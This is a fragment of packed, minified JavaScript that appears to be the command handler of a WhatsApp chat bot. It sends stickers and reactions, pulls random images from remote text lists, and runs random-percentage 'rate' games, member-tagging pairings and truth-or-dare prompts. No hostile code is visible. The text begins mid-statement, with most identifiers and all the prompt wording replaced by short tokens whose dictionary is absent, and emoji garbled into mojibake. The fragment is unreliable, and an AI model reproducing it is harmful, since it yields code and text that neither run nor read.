w1=[{1g:`.cs`,1e:{1f:`2p🔖š¡`},V:1},]B w0={U:{R:1M.M.R},Y:`1I 1a go!🏃🏻‍♂️`,1c:w1,1G:1}F C.N(m.E,w0,{H:m}).1j(P=>{L(\'2w!\')})G l\'g6-6R\':l\'lF\':if(!m.1N)L m.z(J.1v)if(!8k)L m.z(J.6a)m.z(J.1i)1M=F 2D.2k(`S:B vZ=[{1g:`.cs`,1e:{1f:`2p🔖š¡`},V:1},]B vY={U:{R:1M.M.R},Y:`1I 1a go!🏃🏻‍♂️`,1c:vZ,1G:1}F C.N(m.E,vY,{H:m}).1j(P=>{L(\'2w!\')})G l\'lD\':if(!m.1N)L m.z(J.1v)if(!8k)L m.z(J.6a)m.z(J.1i)1M=F 2D.2k(`S:1m 3u=[{1g:`.${K}`,1e:{1f:`2p😼`},V:1},]B vX={U:{R:1M.M.R},Y:`1I 1a go!🏃🏻‍♂️`,1J:`${W.1b}`,1c:3u,1G:4}F C.N(m.E,vX,{H:m}).1j(P=>{L(\'2w!\')})G l\'aV\':m.z(J.1i)1M=F 2D.2k(`S:1m 3u=[{1g:`.${K}`,1e:{1f:`2p😼`},V:1},]B vW={U:{R:1M.M.R},Y:`1I 1a go!🏃🏻‍♂️`,1J:`${W.1b}`,1c:3u,1G:4}F C.N(m.E,vW,{H:m}).1j(P=>{L(\'2w!\')})G l\'mM\':m.z(J.1i)1M=F 2D.2k(`S:1m 3u=[{1g:`.${K}`,1e:{1f:`2p😼`},V:1},]B vV={U:{R:1M.M.R},Y:`1I 1a go!🏃🏻‍♂️`,1J:`${W.1b}`,1c:3u,1G:4}F C.N(m.E,vV,{H:m}).1j(P=>{L(\'2w!\')})G l\'mL\':m.z(J.1i)1M=F 2D.2k(`S:B vU=[{1g:`.ez`,1e:{1f:`2p🔖š¡`},V:1},]B vT={U:{R:1M.M.R},Y:`1I 1a go!🏃🏻‍♂️`,1c:vU,1G:1}F C.N(m.E,vT,{H:m}).1j(P=>{L(\'2w!\')})G l\'mN\':m.z(J.1i)1M=F 2D.2k(`S:1m 3u=[{1g:`.${K}`,1e:{1f:`2p😼`},V:1},]B vS={U:{R:1M.M.R},Y:`1I 1a go!🏃🏻‍♂️`,1J:`${W.1b}`,1c:3u,1G:4}F C.N(m.E,vS,{H:m}).1j(P=>{L(\'2w!\')})G l\'aY\':m.z(J.1i)vR=F 2D.2k(\'S://6R.pW/7B/g5/aS\')1m bN=[{1g:`.aS`,1e:{1f:`2p😼`},V:1},]B vQ={U:{R:vR.M.R},Y:`1I 1a go!🏃🏻‍♂️`,1J:`${W.1b}`,1c:bN,1G:4}F C.N(m.E,vQ,{H:m}).1j(P=>{L(\'2w!\')})G l\'mA\':m.z(J.1i)1M=F 2D.2k(`S:1m 3u=[{1g:`.${K}`,1e:{1f:`2p😼`},V:1},]B vP={U:{R:1M.M.R},Y:`1I 1a go!🏃🏻‍♂️`,1J:`${W.1b}`,1c:3u,1G:4}F C.N(m.E,vP,{H:m}).1j(P=>{L(\'2w!\')})G l\'mE\':m.z(J.1i)1M=F 2D.2k(`S:1m 3u=[{1g:`.${K}`,1e:{1f:`2p😼`},V:1},]B vO={U:{R:1M.M.R},Y:`1I 1a go!🏃🏻‍♂️`,1J:`${W.1b}`,1c:3u,1G:4}F C.N(m.E,vO,{H:m}).1j(P=>{L(\'2w!\')})G l\'mD\':m.z(J.1i)1M=F 2D.2k(`S:1m 3u=[{1g:`.${K}`,1e:{1f:`2p😼`},V:1},]B vN={U:{R:1M.M.R},Y:`1I 1a go!🏃🏻‍♂️`,1J:`${W.1b}`,1c:3u,1G:4}F C.N(m.E,vN,{H:m}).1j(P=>{L(\'2w!\')})G l\'aY\':m.z(J.1i)1M=F 2D.2k(`S:1m 3u=[{1g:`.${K}`,1e:{1f:`2p😼`},V:1},]B vM={U:{R:1M.M.R},Y:`1I 1a go!🏃🏻‍♂️`,1J:`${W.1b}`,1c:3u,1G:4}F C.N(m.E,vM,{H:m}).1j(P=>{L(\'2w!\')})G l\'Iz\':m.z(J.1i)1M=F 2D.2k(`S:1m 3u=[{1g:`.${K}`,1e:{1f:`2p😼`},V:1},]B vL={U:{R:1M.M.R},Y:`1I 1a go!🏃🏻‍♂️`,1J:`${W.1b}`,1c:3u,1G:4}F C.N(m.E,vL,{H:m}).1j(P=>{L(\'2w!\')})G l\'mC\':m.z(J.1i)1M=F 2D.2k(`S:1m 3u=[{1g:`.${K}`,1e:{1f:`2p😼`},V:1},]B vK={U:{R:1M.M.R},Y:`1I 1a go!🏃🏻‍♂️`,1J:`${W.1b}`,1c:3u,1G:4}F C.N(m.E,vK,{H:m}).1j(P=>{L(\'2w!\')})G l\'mB\':m.z(J.1i)1M=F 2D.2k(`S:1m 3u=[{1g:`.${K}`,1e:{1f:`2p😼`},V:1},]B vJ={U:{R:1M.M.R},Y:`1I 1a go!🏃🏻‍♂️`,1J:`${W.1b}`,1c:3u,1G:4}F C.N(m.E,vJ,{H:m}).1j(P=>{L(\'2w!\')})G l\'lE\':if(!m.1N)L m.z(J.1v)if(!8k)L m.z(J.6a)m.z(J.1i)1M=F 2D.2k(`S:1m 3u=[{1g:`.${K}`,1e:{1f:`2p😼`},V:1},]B vI={U:{R:1M.M.R},Y:`1I 1a go!🏃🏻‍♂️`,1J:`${W.1b}`,1c:3u,1G:4}F C.N(m.E,vI,{H:m}).1j(P=>{L(\'2w!\')})G l\'mz\':m.z(J.1i)1M=F 2D.2k(`S:1m vH=[{1g:`.${K}`,1e:{1f:`2p😼`},V:1},]B vG={U:{R:1M.M.R},Y:`1I 1a go!🏃🏻‍♂️`,1J:`${W.1b}`,1c:vH,1G:4}F C.N(m.E,vG,{H:m}).1j(P=>{L(\'2w!\')})G l\'mx\':m.z(J.1i)1M=F 2D.2k(`S:1m vF=[{1g:`.${K}`,1e:{1f:`2p😼`},V:1},]B vE={U:{R:1M.M.R},Y:`1I 1a go!🏃🏻‍♂️`,1J:`${W.1b}`,1c:vF,1G:4}F C.N(m.E,vE,{H:m}).1j(P=>{L(\'2w!\')})G l\'mw\':m.z(J.1i)1M=F 2D.2k(`S:1m vD=[{1g:`.${K}`,1e:{1f:`2p😼`},V:1},]B vC={U:{R:1M.M.R},Y:`1I 1a go!🏃🏻‍♂️`,1J:`${W.1b}`,1c:vD,1G:4}F C.N(m.E,vC,{H:m}).1j(P=>{L(\'2w!\')})G l\'mv\':m.z(J.1i)1M=F 2D.2k(`S:1m vB=[{1g:`.${K}`,1e:{1f:`2p😼`},V:1},]B vA={U:{R:1M.M.R},Y:`1I 1a go!🏃🏻‍♂️`,1J:`${W.1b}`,1c:vB,1G:4}F C.N(m.E,vA,{H:m}).1j(P=>{L(\'2w!\')})G l\'mt\':m.z(J.1i)1M=F 2D.2k(`S:1m vz=[{1g:`.${K}`,1e:{1f:`2p😼`},V:1},]B vy={U:{R:1M.M.R},Y:`1I 1a go!🏃🏻‍♂️`,1J:`${W.1b}`,1c:vz,1G:4}F C.N(m.E,vy,{H:m}).1j(P=>{L(\'2w!\')})G l\'ms\':m.z(J.1i)1M=F 2D.2k(`S:1m vx=[{1g:`.${K}`,1e:{1f:`2p😼`},V:1},]B vw={U:{R:1M.M.R},Y:`1I 1a go!🏃🏻‍♂️`,1J:`${W.1b}`,1c:vx,1G:4}F C.N(m.E,vw,{H:m}).1j(P=>{L(\'2w!\')})G l\'mr\':m.z(J.1i)1M=F 2D.2k(`S:1m vv=[{1g:`.${K}`,1e:{1f:`2p😼`},V:1},]B vu={U:{R:1M.M.R},Y:`1I 1a go!🏃🏻‍♂️`,1J:`${W.1b}`,1c:vv,1G:4}F C.N(m.E,vu,{H:m}).1j(P=>{L(\'2w!\')})G l\'mq\':m.z(J.1i)1M=F 2D.2k(`S:1m vt=[{1g:`.${K}`,1e:{1f:`2p😼`},V:1},]B vs={U:{R:1M.M.R},Y:`1I 1a go!🏃🏻‍♂️`,1J:`${W.1b}`,1c:vt,1G:4}F C.N(m.E,vs,{H:m}).1j(P=>{L(\'2w!\')})G l\'mp\':m.z(J.1i)1M=F 2D.2k(`S:1m vr=[{1g:`.${K}`,1e:{1f:`2p😼`},V:1},]B vq={U:{R:1M.M.R},Y:`1I 1a go!🏃🏻‍♂️`,1J:`${W.1b}`,1c:vr,1G:4}F C.N(m.E,vq,{H:m}).1j(P=>{L(\'2w!\')})G l\'mo\':m.z(J.1i)1M=F 2D.2k(`S:1m vp=[{1g:`.${K}`,1e:{1f:`2p😼`},V:1},]B vo={U:{R:1M.M.R},Y:`1I 1a go!🏃🏻‍♂️`,1J:`${W.1b}`,1c:vp,1G:4}F C.N(m.E,vo,{H:m}).1j(P=>{L(\'2w!\')})G l\'mn\':m.z(J.1i)1M=F 2D.2k(`S:1m vm=[{1g:`.${K}`,1e:{1f:`2p😼`},V:1},]B vl={U:{R:1M.M.R},Y:`1I 1a go!🏃🏻‍♂️`,1J:`${W.1b}`,1c:vm,1G:4}F C.N(m.E,vl,{H:m}).1j(P=>{L(\'2w!\')})G l\'aX\':m.z(J.1i)1M=F 2D.2k(`S:1m vk=[{1g:`.${K}`,1e:{1f:`2p😼`},V:1},]B vj={U:{R:1M.M.R},Y:`1I 1a go!🏃🏻‍♂️`,1J:`${W.1b}`,1c:vk,1G:4}F C.N(m.E,vj,{H:m}).1j(P=>{L(\'2w!\')})G l\'ml\':m.z(J.1i)1M=F 2D.2k(`S:1m vi=[{1g:`.${K}`,1e:{1f:`2p😼`},V:1},]B vh={U:{R:1M.M.R},Y:`1I 1a go!🏃🏻‍♂️`,1J:`${W.1b}`,1c:vi,1G:4}F C.N(m.E,vh,{H:m}).1j(P=>{L(\'2w!\')})G l\'aV\':m.z(J.1i)1M=F 2D.2k(`S:1m vg=[{1g:`.${K}`,1e:{1f:`2p😼`},V:1},]B vf={U:{R:1M.M.R},Y:`1I 1a go!🏃🏻‍♂️`,1J:`${W.1b}`,1c:vg,1G:4}F C.N(m.E,vf,{H:m}).1j(P=>{L(\'2w!\')})G l\'mk\':m.z(J.1i)1M=F 2D.2k(`S:1m ve=[{1g:`.${K}`,1e:{1f:`2p😼`},V:1},]B vd={U:{R:1M.M.R},Y:`1I 1a go!🏃🏻‍♂️`,1J:`${W.1b}`,1c:ve,1G:4}F C.N(m.E,vd,{H:m}).1j(P=>{L(\'2w!\')})G l\'mj\':m.z(J.1i)1M=F 2D.2k(`S:1m vc=[{1g:`.${K}`,1e:{1f:`2p😼`},V:1},]B vb={U:{R:1M.M.R},Y:`1I 1a go!🏃🏻‍♂️`,1J:`${W.1b}`,1c:vc,1G:4}F C.N(m.E,vb,{H:m}).1j(P=>{L(\'2w!\')})G l\'mi\':m.z(J.1i)1M=F 2D.2k(`S:1m va=[{1g:`.${K}`,1e:{1f:`2p😼`},V:1},]B v9={U:{R:1M.M.R},Y:`1I 1a go!🏃🏻‍♂️`,1J:`${W.1b}`,1c:va,1G:4}F C.N(m.E,v9,{H:m}).1j(P=>{L(\'2w!\')})G l\'mh\':m.z(J.1i)1M=F 2D.2k(`S:1m v8=[{1g:`.${K}`,1e:{1f:`2p😼`},V:1},]B v7={U:{R:1M.M.R},Y:`1I 1a go!🏃🏻‍♂️`,1J:`${W.1b}`,1c:v8,1G:4}F C.N(m.E,v7,{H:m}).1j(P=>{L(\'2w!\')})G l\'mg\':m.z(J.1i)1M=F 2D.2k(`S:1m v6=[{1g:`.${K}`,1e:{1f:`2p😼`},V:1},]B v5={U:{R:1M.M.R},Y:`1I 1a go!🏃🏻‍♂️`,1J:`${W.1b}`,1c:v6,1G:4}F C.N(m.E,v5,{H:m}).1j(P=>{L(\'2w!\')})G l\'mb\':m.z(J.1i)1M=F 2D.2k(`S:1m v4=[{1g:`.${K}`,1e:{1f:`2p😼`},V:1},]B v3={U:{R:1M.M.R},Y:`1I 1a go!🏃🏻‍♂️`,1J:`${W.1b}`,1c:v4,1G:4}F C.N(m.E,v3,{H:m}).1j(P=>{L(\'2w!\')})G l\'aW\':m.z(J.1i)1M=F 2D.2k(`S:1m v2=[{1g:`.${K}`,1e:{1f:`2p😼`},V:1},]B v1={U:{R:1M.M.R},Y:`1I 1a go!🏃🏻‍♂️`,1J:`${W.1b}`,1c:v2,1G:4}F C.N(m.E,v1,{H:m}).1j(P=>{L(\'2w!\')})G l\'Iy\':m.z(J.1i)ud=F 2D.2k(\'S://6R.pW/7B/g5/cu\')1m bN=[{1g:`.cu`,1e:{1f:`2p😼`},V:1},]B v0={U:{R:ud.M.R},Y:`1I 1a go!🏃🏻‍♂️`,1J:`${W.1b}`,1c:bN,1G:4}F C.N(m.E,v0,{H:m}).1j(P=>{L(\'2w!\')})G l\'aW\':m.z(J.1i)ud=F 2D.2k(\'S://6R.pW/7B/g5/pV\')1m bN=[{1g:`.pV`,1e:{1f:`2p😼`},V:1},]B uZ={U:{R:ud.M.R},Y:`1I 1a go!🏃🏻‍♂️`,1J:`${W.1b}`,1c:bN,1G:4}F C.N(m.E,uZ,{H:m}).1j(P=>{L(\'2w!\')})G l\'aX\':m.z(J.1i)1M=F 2D.2k(`S:1m 3u=[{1g:`.${K}`,1e:{1f:`2p😼`},V:1},]B uY={U:{R:1M.M.R},Y:`1I 1a go!🏃🏻‍♂️`,1J:`${W.1b}`,1c:3u,1G:2}F C.N(m.E,uY,{H:m}).1j(P=>{L(\'2w!\')})G l\'m8\':l\'Ix\':{1m 6y=F 3H(\'S://5K.6i.3z/br/M/8d/Iw\')1m 4O=6y.1h(\'\\n\')1m 6x=4O[1C.2v(1C.1V()*4O.1F)]3W=F C.5J(1k,6x,m,{2N:W.2N,2u:W.2u,})F fs.3j(3W)}G l\'eF\':{if(!D)L m.z(`*2o:${j+K}uX*`)F C.uW(m.E,`S:}G l\'Iv\':l\'Iu\':l\'m5\':{1m 6y=F 3H(\'S://5K.6i.3z/br/M/8d/Ir\')1m 4O=6y.1h(\'\\n\')1m 6x=4O[1C.2v(1C.1V()*4O.1F)]3W=F C.5J(1k,6x,m,{2N:W.2N,2u:W.2u,})F fs.3j(3W)}G l\'m4\':l\'Iq\':{1m 6y=F 3H(\'S://5K.6i.3z/br/M/8d/Ip\')1m 4O=6y.1h(\'\\n\')1m 6x=4O[1C.2v(1C.1V()*4O.1F)]3W=F C.5J(1k,6x,m,{2N:W.2N,2u:W.2u,})F fs.3j(3W)}G l\'ey\':l\'Io\':{1m 6y=F 3H(\'S://5K.6i.3z/br/M/8d/ey\')1m 4O=6y.1h(\'\\n\')1m 6x=4O[1C.2v(1C.1V()*4O.1F)]3W=F C.5J(1k,6x,m,{2N:W.2N,2u:W.2u,})F fs.3j(3W)}G l\'Im\':if(!D)L m.z(`dI g3,2o:${j+K}@ad`)1d pU=[\'1\',\'2\',\'3\',\'4\',\'5\',\'6\',\'7\',\'8\',\'9\',\'10\',\'11\',\'12\',\'13\',\'14\',\'15\',\'16\',\'17\',\'18\',\'19\',\'20\',\'21\',\'22\',\'23\',\'24\',\'25\',\'26\',\'27\',\'28\',\'29\',\'30\',\'31\',\'32\',\'33\',\'34\',\'35\',\'36\',\'37\',\'38\',\'39\',\'40\',\'41\',\'42\',\'43\',\'44\',\'45\',\'46\',\'47\',\'48\',\'49\',\'50\',\'51\',\'52\',\'53\',\'54\',\'55\',\'56\',\'57\',\'58\',\'59\',\'60\',\'61\',\'62\',\'63\',\'64\',\'65\',\'66\',\'67\',\'68\',\'69\',\'70\',\'71\',\'72\',\'73\',\'74\',\'75\',\'76\',\'77\',\'78\',\'79\',\'80\',\'81\',\'82\',\'83\',\'84\',\'85\',\'86\',\'87\',\'88\',\'89\',\'90\',\'91\',\'92\',\'93\',\'94\',\'95\',\'96\',\'97\',\'98\',\'99\',\'7t\']1d uV=pU[1C.2v(1C.1V()*pU.1F)]C.N(1k,{D:`*${K}*\\n\\pR:${q}\\4R:*${uV}%*`},{H:m})G l\'lz\':if(!D)L m.z(`dI g3,2o:${j+K}@ad`)1d 4t=[\'1\',\'2\',\'3\',\'4\',\'5\',\'6\',\'7\',\'8\',\'9\',\'10\',\'11\',\'12\',\'13\',\'14\',\'15\',\'16\',\'17\',\'18\',\'19\',\'20\',\'21\',\'22\',\'23\',\'24\',\'25\',\'26\',\'27\',\'28\',\'29\',\'30\',\'31\',\'32\',\'33\',\'34\',\'35\',\'36\',\'37\',\'38\',\'39\',\'40\',\'41\',\'42\',\'43\',\'44\',\'45\',\'46\',\'47\',\'48\',\'49\',\'50\',\'51\',\'52\',\'53\',\'54\',\'55\',\'56\',\'57\',\'58\',\'59\',\'60\',\'61\',\'62\',\'63\',\'64\',\'65\',\'66\',\'67\',\'68\',\'69\',\'70\',\'71\',\'72\',\'73\',\'74\',\'75\',\'76\',\'77\',\'78\',\'79\',\'80\',\'81\',\'82\',\'83\',\'84\',\'85\',\'86\',\'87\',\'88\',\'89\',\'90\',\'91\',\'92\',\'93\',\'94\',\'95\',\'96\',\'97\',\'98\',\'99\',\'7t\']1d g4=4t[1C.2v(1C.1V()*4t.1F)]C.N(1k,{D:`*${K}*\\n\\Il:${q}\\4R:*${g4}%*`},{H:m})G l\'lq\':if(!D)L m.z(`dI g3,2o:${j+K}@ad`)1d pT=[\'Ik\',\'Ij\',\'Ii\',\'Ih\',\'Ig\',\'ap\',\'Ie\',\'Id-Ic\',\'Ib\',\'I9\',\'uz, I8\',\'I7\']1d uU=pT[1C.2v(1C.1V()*pT.1F)]C.N(1k,{D:`I6 I5:${q}\\4R:*${uU}*`},{H:m})G l\'ly\':l\'I4\':l\'lv\':l\'lt\':l\'I3\':l\'lw\':l\'lr\':l\'lx\':l\'lp\':l\'ls\':if(!D)L m.z(`dI g3,2o:${j+K}@ad`)1d pS=[\'1\',\'2\',\'3\',\'4\',\'5\',\'6\',\'7\',\'8\',\'9\',\'10\',\'11\',\'12\',\'13\',\'14\',\'15\',\'16\',\'17\',\'18\',\'19\',\'20\',\'21\',\'22\',\'23\',\'24\',\'25\',\'26\',\'27\',\'28\',\'29\',\'30\',\'31\',\'32\',\'33\',\'34\',\'35\',\'36\',\'37\',\'38\',\'39\',\'40\',\'41\',\'42\',\'43\',\'44\',\'45\',\'46\',\'47\',\'48\',\'49\',\'50\',\'51\',\'52\',\'53\',\'54\',\'55\',\'56\',\'57\',\'58\',\'59\',\'60\',\'61\',\'62\',\'63\',\'64\',\'65\',\'66\',\'67\',\'68\',\'69\',\'70\',\'71\',\'72\',\'73\',\'74\',\'75\',\'76\',\'77\',\'78\',\'79\',\'80\',\'81\',\'82\',\'83\',\'84\',\'85\',\'86\',\'87\',\'88\',\'89\',\'90\',\'91\',\'92\',\'93\',\'94\',\'95\',\'96\',\'97\',\'98\',\'99\',\'7t\']1d uT=pS[1C.2v(1C.1V()*pS.1F)]C.N(1k,{D:`*${K}*\\n\\pR:${q}\\4R:*${uT}%*`},{H:m})G l\'I2\':l\'lh\':l\'le\':l\'et\':l\'lf\':l\'I1\':l\'es\':l\'ld\':l\'eq\':l\'uL\':l\'I0\':l\'li\':l\'HZ\':l\'ep\':l\'lb\':l\'lg\':l\'lm\':l\'ll\':l\'lk\':l\'ln\':l\'uD\':l\'lj\':l\'cq\':l\'uN\':l\'HY\':l\'HX\':l\'HV\':l\'HU\':l\'HT\':l\'eo\':l\'en\':l\'HS\':l\'HR\':l\'HQ\':l\'HP\':l\'HO\':l\'HN\':l\'HM\':l\'HL\':l\'HK\':l\'lc\':l\'er\':l\'HJ\':l\'HI\':l\'HG\':l\'er\':l\'mc\':l\'HF\':l\'HE\':l\'HD\':l\'HC\':l\'HB\':l\'HA\':l\'la\':l\'Hz\':l\'eo\':l\'en\':l\'l8\':l\'l7\':l\'l6\':l\'l5\':l\'l9\':l\'l4\':l\'l3\':l\'l2\':l\'l1\':l\'l0\':l\'kZ\':l\'kY\':l\'eu\':l\'kX\':l\'mf\':l\'kW\':l\'Hy\':l\'Hx\':l\'Hw\':l\'Hv\':l\'Hu\':l\'kV\':l\'kU\':l\'kT\':l\'kS\':l\'kR\':l\'cr\':{if(!m.1N)L m.z(`${J.1v}`)B 5n=3V.2L(u=>u.id)B me=m.1l B 8j=5n[1C.2v(1C.1V()*5n.1F)]B 4m=`1X Ht*${K}*1I Is@${8j.1h(\'@\')[0]}`B 5u=[me,8j]B 1c=[{1g:\'🔖‘\',1e:{1f:\'🔖‘🔖˜‚\'},V:1}]F C.2a(m.E,1c,4m,1b,m,{3y:5u})}G l\'7Q\':1d 7Q=["Hs 2 Hr of Hq bK 4l Hp Ho, if it\'s Hn 1a 4t Hm","Hl bG 3g 7y 1a Hk","8Z 7w/Hj 8h 2W 2F ss","pN pH 5P Hh ai 1a V on gc/pc 1U 1 po.","6E uS to 7x Hg To Be a Hf! to 7Y 1n uR 1a 3P","8Z ex bM uQ","fU 1n Hd of 1n 4w 5F 1a Hc","vn 2h ex/7w/dF, uv hi (2m), Hb to 8Z, pK a 8i. I uQ🔖¥º🔖‘‰🔖¼🔖‘ˆ🔖¼","Ha on 1n H9 (fT is at uc) H8 1a 2k H7 1U pQ H6","uI 1V bG H5 7c pK tN I 7c 2h H4 pr, we H3, 1u I dy H2 H1. sV 1o is 1n 6C H0 8T","GZ ex\'s 2m","7y 1 GY 1U 1n 3I!","2F ur 2d E 6c","E 1V bG 3N GX GW 1u ss 6D","dD 2h ua GV of pE u1","2X 1n 4Z 1a uf","GU to be g2, 1U uP: g2 by eq, g2 by GT, g2 by GS, GR.","bL 2m to *I AM GQ* 1U 24 dG","fZ *ma pP ma pP ma pP* in fY of 2h GP","pJ/pO fS ao/7w","dD me 2h fS V!","6E *i hv 7w on 1a, do 1a 8W to be my dF?* to 1n GO GN, 1n 4w ai 1a GM (GL on wa/GK), 1i 1U al to z, if 1a 3P, pN 6D","GJ ur 6F 5o 7u *g1 ke GI do g1, g1 ke GH do g1*","GG E ex 2W 6E *i 7d u, uO GF GE.* bK bM 7Q!","E to uw wa in 1n 8O GD to 2h GC %, 1u dD al *i am GB to hv 1a!*","bL 1n 2m to *I am a GA of uN* 1U 5 dG","V in Gz 24 dG","1K Gy Gx ao 1U 3 pC","pN a 5F uM 1u 2X a Gw 5n 1U 5o uM","2F 6F 7A bM 4t i 8Z u uy?","ss Gv 8Z 2d","uE *uC uB SO uA Gu\'T Gt* to Gs!","uF to a 1v 5n, 2W 6E uL 1a","Gr 6k a Gq in fY of ur dz","Gp up a 1V Go 2W 7u 8e uK g0 Gn in vn n 2F it 6D","pM 2h fY Gm 2W Gl 6k a cN 1U 10 7f","Gk an pE Gj 2W Gi it on 2h uJ 7a","Gh 1n 1v 7r a aj 2W a Gg Ge 5F. 4e 3P to fU 5o 5F 2W 2F it in 6F 7A","Gd on 2h Gc 2W Gb 1U as pB as 1a 4t","fU Ga G9 in 6F 7A","G8 1U 30 7f in 1n G7 1x🔖˜‚","uI 1n G6 pL 1a uH","7y a G5 9Q 2V 2W 7z it on 3t 1U G4","G3 a 5K G2 of G1","G0 1n 4w ub bG 1a FZ 2W 5E 1n 6G FY","7z 2h FX 2m on 3t 1U ak","7y a FW 9Q 2V bK 4l 5O pK 3N a FV 2W 7z it on ur 3t 1U ak","8Z ur uG, FU","7z 2h ao bK 5O on ur 3t 1U FT","6E i 7d FS FR in 6F 7A🔖🔖","3U a 1W to 2h ex 2W 6E I 5w 6k 1a","8Z FQ/dF/uG 8h 2W uk 6D","uF to 8e of 1n 1v 5n ux E 2W uE 1a uD FP","6E uC uB uA/FO to 8e of 4Z 3g is in uz of ur FN or 1n pr 4Z on ur FM","2F 6F FL 2W 6E, 4t i 8Z u uy, if u r 8V 2X 8Y/if 8Y 2X 8V","8X i 7d 1a (1V ag 5n 2m, 3g is 1D) in ux E, (if u r 8V 8X 8Y 2m/if 8Y 8X 8V 2m) cz a pJ of 1n ut 2W 2F it 6D","tB 4l FK FJ ao as ur FI 1U 3 pC","7z 2h 7w ao on 3t 3N Y, 1o is my 7w","bL 2m to I AM FH 1U 5 dG","E to 4l uw in 2d 2W 6E i 5N be ur bf/gf 1U FG","2F 6F 7A uv i hv 7w on 1a, 8W to be my dF/fS or 4D? to 4l 1V 4Z 1k 1n ag(if u 8Y 7r 8V, if 8V 7r 8Y","9S ur FF FE 2F 1n aa of 9S bJ 6F 7A🔖˜‚","5Y ur gf/bf V 2W 2F 1n ao 6D 3N Y, FD 8Y/8V in 1n FC","fZ FB 2W 2F 6D bJ 6F 7A","pJ 2h FA 1u 2F it 6D","3U 2h ao 3N a Y, i am cq","fZ dH Fz dt 2W 2F it 6D bJ vn","fZ 1a es in fY of 2h pG/ul","bL 1n 2m to i am et 1U 24 dG","9S Fy Fx 2W 2F 1n aa of 9S bJ 6F 7A🔖˜‚","6E i 7d 1n 6X 2j uu bJ 6F 7A","2F 2h gf/bf ut 6D","7y 4l 6t 9Q uq 2V 2W 7z it on 3t, u 4t 2y it fW ak","Fw 3N 2h Fv bH 1U ak bK uo al/fX 5o um a 7Q","dD 8e of 2h Fu 5o u 7d al/fX 2W pI Ft al/fX, bK uo al/fX 5o um a 7Q","6E i 7d Fs Fr bJ 6F 7A","8X i am Fq ep 2W 7z it on 3t, u 4t 2y it pH fW ak","8X i am cq 2W 7z it on 3t, u 4t 2y pH fW ak","eA 2h Fp or ul 2W 6E i 7d 1a🔖˜Œ","7z 2h uh 2m on 3t 1U ak","2F Fo dt in 4l ag, Fn 1o ag, 2W 2F uk Fm 6D"]1d uj=7Q[1C.2v(1C.1V()*7Q.1F)]3b=F 3i(`S:C.N(1k,{U:3b,Y:\'tM 7r Fl\\n\'+uj},{H:m})G G l\'aP\':1d aP=["7e 1a 3J dC u7? pq pB?","If 1a 4t or if 1a 8W, fT gc/Fk gc ae 1a 7y sU 3N? (Fj Fi/ui V)","fV Fh Fg Ff?","7e 1a 3J dC ah 2W u6 5o 4Z u5 1a u4?","3o is 1n 2m of 2h bH\'s ex-dF 5o 1a dE to Fe 6k?","7e 1a 3J tZ pA 1k 2h uh or pG? 1X 8U?","3o pv 1a 9R aR 1a\'re px?","Fd dy a 8e Fc 7d? if so 3g? 9P pF it u0 Fb?","4x ah\'s Fa?","1n 6C F9 8T","7x is 1n 6C F8 4Z in 2h pw?","5E u2 8T pz 1a 2k 1o fR","7x is 1n 4Z 3g 4t 7y 1a F7","7x is 1n 4Z 3g 3G 3J dB 1a F6 9R?","7x is F5 to 2h F4 V of bI 6D","7x do 1a 6k to 5h 3N??","7e 1a 3J ug bG? 1n 8U dA?","tY an tX 5o dB 1a tW 5o 1a 5w tV","3o tU 3P 1a pu 1o fR??","3o\'s 2h pt tT at fQ??","3o 5F do 1a fU 6C in 1n F3","7e 1a 3J dy a F2-F1 F0","pD 7c 1n 4w ai 1a EZ EY EX. EW?","7x is 1n 4w 4Z 3g EV 1a","Do 1a 3P 4l EU ET, 3o 4y ES","3o aj do 1a uf 1n 6C?","3o is 1n 4w dd 2V 1a ER?","3o is 1n 4w 8T 1a EQ","7x in 1o 1v ae 1a 8W to EP EO 3N 1U a EN","3o is 1n EM 8T EL 3J EK to 1a","7e 1a 3J EJ 2W EI it on ah 1y","pD is 1n 4w ai 1a dB ah 1y eB","7e 1a 3J EH a bH","7e 1a 3J EG a EF 6b","EE of 2h sW 3I ED 1a 1n 6C 2W dA","If 1a dy to 2y 8e ue 1k 2h EC, fT 8e ae it be","3o ue do 1a EB 1n 6C ai on","7e 1a 3J EA Ez to 2k uc 1k fQ","3o is 1n 6C pE Ey in 2h 1x","3o ub Ex ae 1a Ew if 1a pu Ev on a Eu Et","7e 1a 3J Es so Er 1a u9 2h Eq","Do 1a Ep 2h ua Eo","3P u 3J u9 on 1n En u8 Em Ã°Å¸🔖¤🔖£Ã°Å¸🔖¤🔖£","3o is 1n fP El 1a 3P 3J dB","7e 1a 3J u3 in an Ek","3o is 1n pt 8T 1a 3P 3J Ej","pD 7c 1n 4w ai 1a Ei","tO do 1a 7d 1n 6C Eh ur dz","do u Eg 7z ur Ef in ur EeÃ°Å¸🔖¤🔖£","3g 7c ur 7w Ed 1n fQ pC","dD Ec, do u 6k 4l 8V in 1o ag","3P 1a 3J dC u7? 9P pB?","do 1a 3P gf/bf\',\'5E is 2h fP Eb?","3P 1a 3J dC ah 2W u6 5o 4Z u5 1a u4?","3o is 1n 2m of 2h ex fS of 2h bH 5o 1a Ea dC E9?","3J pz 1a E8 2h E7 pA or 2h E6 pA","5E pv 1a 9R aR 1a 4y px","do 1a 6k ah 3g is in 1o ag? if 1a 1u 3g?","3P 1a 3J 4x u3 on by bG?","3g is 1n 6C E5 4Z in 2h pw","5E u2 u1 pz 1a 2k 1o fR","3g is 1n 4Z 3g 4t 7y 1a 9R aR u r px","3g is 1n 4Z 3g 3J dB 1a u0 E4","3P 1a 3J E3 to 2h dz","do 1a 5w 6k ur ex","3g do 1a 6k to 5h E2 3N?","3P 1a 3J tZ E1 8T in ur pw? 1n 8U dA?","tY 1n tX 5o pv 1a tW 5o 1a 5w tV","5E tU 3P 1a pu 1o fR?","5E 7c 2h pt tT at fQ?","do 1a 7d 1n 6X ps, E0 DZ?🔖","3P 1a 3J DY of DX DW 1k ur DV?","do 1a 6k DU DT DS of ur tS","1a DR tR or tR","if 1a pp be DQ, 5E is 1n pr 8T 1a ae do","5E is a tQ 1a DP 1k 2h dz","7x is 2h tQ 7w","DO 1n 4w 4Z 1a DN on DM 1S","If a DL DK 1a DJ DI, 5E ae 1a tP 1U","3o is 2h fP DH","3o DG do 1a DF 1a 6C DE 6k","pq DC DB do 1a cz a po","3o 7c 2h DA Dz Dy","if 1a pp be a Dx Dw 1U a po, 3g ae 1a 7r","tO do 1a D 1n 6C","3o is 1n fP Dv 1a 3J tN 2h dz","7x is 2h Du 7w","Dt 1n Ds Dr 1a 3P 3J dy","do 1a 5h Dq, if 1a 1u 2F ur id 8J"]1d 